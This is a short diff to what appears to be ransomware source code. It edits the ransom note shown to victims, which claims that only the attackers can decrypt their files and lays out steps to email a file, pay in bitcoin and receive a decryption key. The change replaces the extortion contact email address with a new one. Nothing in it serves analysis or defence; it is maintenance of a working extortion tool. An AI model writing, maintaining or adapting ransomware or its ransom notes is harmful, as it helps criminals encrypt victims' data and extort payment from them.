@@ -155,10 +155,10 @@ Only we can decrypt your files!
 
 To purchase your key and restore your data, please follow these three easy steps:
 
-1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to cem-celik2@web.de
+1. Email the file called EMAIL_ME.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to kowqer@proton.me
 
 2. You will recieve your personal BTC address for payment (0,000042 BTC).
-   Once payment has been completed, send another email to cem-celik2@web.de stating "PAID".
+   Once payment has been completed, send another email to kowqer@proton.me stating "PAID".
    We will check to see if payment has been paid.
 
 3. You will receive a text file with your KEY that will unlock all your files. 
